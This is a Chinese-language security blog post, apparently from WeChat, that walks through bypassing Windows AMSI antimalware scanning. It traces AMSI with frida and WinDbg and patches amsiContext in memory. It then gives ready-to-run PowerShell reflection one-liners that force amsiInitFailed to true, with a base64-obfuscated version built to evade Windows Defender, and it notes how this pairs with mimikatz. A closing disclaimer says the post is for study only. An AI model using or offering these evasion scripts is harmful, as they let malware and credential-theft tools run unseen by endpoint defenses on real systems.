> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3p2OLpjJ73kJ3Sm1I75gMw)

测试环境：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOynvDloI5Ha9aOJGTqMBPrfdoxWHVa0s2741Ygic1016GvLqCP9VEO7Q/640?wx_fmt=png)

工具环境：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHORzeYUXcaze528TdFj0pAhboNGYpnZYv9XjiaHZonmjNds50XLhLO6ww/640?wx_fmt=png)

测试过程：

首先我们要知道 AMSI 是一个什么东西，之前做过相关的分享，这里就不再去啰嗦其概念了，一句话概括，win10 自带的一个扫描接口，其核心组件存在于 amsi.dll 内，与 windows defender 相辅相成，过程如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOjB53QTDic63WZlsQ5HpB6fNZFUZwe3yAlRnOD3ug9HkWUPw2XSKD5icg/640?wx_fmt=png)

更具体的函数结构体什么的，自己去看 MSDN，链接给你们了。

https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiinitialize

https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiopensession

https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions

https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring

https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer

我们下面便开始从调试开始然后编写绕过 amsi 的脚本，调试过程为 windbg 与 frida。

```
frida-trace -p 15 -x amsi.dll -i Amsi*
```

使用 - p 指定进程 powershell 的 Pid，-x 指定 dll，-i 使用 * 通配符来指定我们需要监控的 API。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOVVQbI6mm0CxejagnTSzo6miaVqXnBJibibn4xh9gQMyaGGTlyibKbqToTQ/640?wx_fmt=png)

此时 frida 以及 Hook 住了 amsi 的相关函数，我们在 powershell 中输入字符串测试：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOa3CErcS18rEteI8xk0R9nxWHianklvvazaqAOJu98RYPuJ3nFcskc2w/640?wx_fmt=png)

我们虽然识别了对 AmsiOpenSession、AmsiScanBuffer 和 AmsiCloseSession 的调用，但无法了解其内部过程，frida 在 Hook 时默认会生成 js 文件，我们可以更改此类文件，来改变其 Hook 时的输出，方便我们理解整个过程。

首先是 AmsiScanBuffer，默认如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOK5PpcqGyIDIyyib3zhtpYrXsYOJs0sYVVvWa0IqgayF5cJicW9lZUrCA/640?wx_fmt=png)

将其更改如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOK6pXeNsqicXMTmHAO7v8NDwLuuQIcD9GXcJfiadxHHAibmWusial7UI8LA/640?wx_fmt=png)

此时我们再来进行测试：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOgAGFl1I1ib1zFhprqhcuOickSw9mmS3iccjhHmYfWJKiaqHuebJ3wN8thg/640?wx_fmt=png)

此时以及变得容易查看与观看，然后我们输入经典的 Amsi 测试语句：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHONVtKNdcw8URegQcm7Mlm6m6mb6QSJkGFyp48u6I2TccDRaTMXFUREQ/640?wx_fmt=png)

不出意外的被拦截了，我们换成绕过的语句：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHODG6KorfWibRaTqSiboEhy7tk7vOTYUg7jXcVRaXPLRrsQwld1q3lcvgw/640?wx_fmt=png)

从这个输入和输出，我们可以推断，WindowsDefender 将 “AmsiUtils” 字符串标记为恶意。然而，我们很容易绕过了这个问题，即使用通过拆分和连接字符串进行保护。

下面我们打开 windbg 并也附加到 powershell 进程之中：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHO2tgvWK37tIiaXXzBxGouibRHcB7PwIxMeFSU8zUCJUwlSZV9DazuCd8w/640?wx_fmt=png)

在 powershell 中输入字符串，测试：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOHQibyiahlAc3lDsnibjWeUaK8TPq48FPYZLjg51P9yWnt4tvxkWQtpNBg/640?wx_fmt=png)

所指的地方是其内存地址，我们使用 windbg 进行追踪：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHO0nma6Q3E6iaKjKE6b0GwCaHEmsPyicSOTeDQSVs21B0efiavaMqAVDfhg/640?wx_fmt=png)

dc：双字值 (4 字节) 和 ASCII 字符。每个显示行都会显示行中第一个数据的地址，并且每行最多显示 8 个 16 进制值以及它们对应的 ASCII 字符。默认的显示数量为 32 个 DWORD(128 字节)。

我们不知道其大小，但可以看到 AMSI 的 ASCII 字符，为了知道其调用方式，我们需要 unassemble，AMSI 模块的 AmsiOpenSession 功能

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOFxMicf7tjYWE1VKZZURNTCAYeTiciaUGeniaLXp1ZKcNDiaHvfabqlweJYQ/640?wx_fmt=png)

我们可以看到我圈起来的地方有明显的内存比较的过程，而 rcx 将包含 AmsiOpenSession 的功能原型，其中有 Jne 指令，为跳转到 0x4c，我们跟一下

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOPZRL5PBykG8AuGcxxJ6weufk5KjX95CUgSAhKwg0Gib67wH8a8VtEcg/640?wx_fmt=png)

条件跳转最终导致函数退出，其静态值为 80070057h，根据 AmsiOpenSession 函数原型我们可知，其为一个返回值为句柄的函数：

```
HRESULT AmsiOpenSession(
  HAMSICONTEXT amsiContext,
  HAMSISESSION *amsiSession
);
```

而 80070057h 则代表：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOPflFxvoDDpZjaceFtGpicicGd8P1NlygibRRniaeOXhPdbUtiadtIveWrSw/640?wx_fmt=png)

到此我们已经了解其大体过程，下面我们来使用 windbg 来走一遍，下断点，并将 rcx 中的 amsi patch 掉：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHO7VXlgcEWVM02ZGFHQyOotLWcVpZFtWUaicia1KWNArMgNg6fyBxH4ldQ/640?wx_fmt=png)

此时便已经绕过了 amsi 打印出了我们的字符串。下面我们使用 Powershell 的反射来进行 Amsi 的绕过，其主要信息存储在：

```
System.Management.Automation.AmsiUtils
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOdxiaIfhuM8YRlMNIOCcgfcWMc5dCiahuhRSdqoygjnMJlurWWkm7iarSQ/640?wx_fmt=png)

这个好说，我们可以使用循环遍历方法来绕过，主要是获取 amsiContext 的值：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOG9BOS14SY3VAtdqx8IUR4T9mia4zRos1LgsiaAa9rdmxG8WictwtCW8vw/640?wx_fmt=png)

将其转成 hex 便是它的内存地址：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOK6YAyrQIkeC4XYNtjs3KyvYRYibLqE0d4k0pibyeWocKCdmUIT5H9snA/640?wx_fmt=png)

根据前面的测试我们知道，我们只需要 patch 前四个字节即可。我们将其 patch 之后，然后再来查看：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOMQKiaWooCRadaWxzHAQ0rR6YBg7jsd7XrM8Cvl97dZHjHicicticKoePXg/640?wx_fmt=png)

此时已无 AMSI，再来测试：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOPezPaFpQTCMLGdkrGhGUSuBWM6CPeb7jfwLEuJc0tOlEHBzWBLQBaQ/640?wx_fmt=png)

当然你也可以使用下面这类方法：

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFai led','NonPublic,Static').SetValue($null,$true)
```

新开一个 powershell 测试：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOibr6t0ib7DIxOK8Xzuc6g8gMj1DjECIAABhzX7jNH9DS1QFciac4Rfy0A/640?wx_fmt=png)

没关系，我们来 bypass，之前有人利用的是 base64：

```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

但现在已经会被标记并查杀了，我们这里对他进行增强：

```
function b64decode {
 param ($encoded) 
 $decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($en coded)) 
 return $decoded
 } 
  $1 = b64decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=") 
  $2 = b64decode("YW1zaUluaXRGYWlsZWQ=") 
  $3 = b64decode("Tm9uUHVibGljLFN0YXRpYw==")
   [Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true)
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UmROxSib1ic1G4EcQZZtQgHOhGJxtibzu4jTryN8gw2luRAljLibmkag4uc3HBxib86IL1EsjOqT2OO3g/640?wx_fmt=png)

注：此类方法不太适合 mimikatz，可以执行，但执行后便会被查杀。若非要使用，则最后使用变换过的 mimikatz。

  

  

  

  

  

     ▼

更多精彩推荐，请关注我们

▼

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)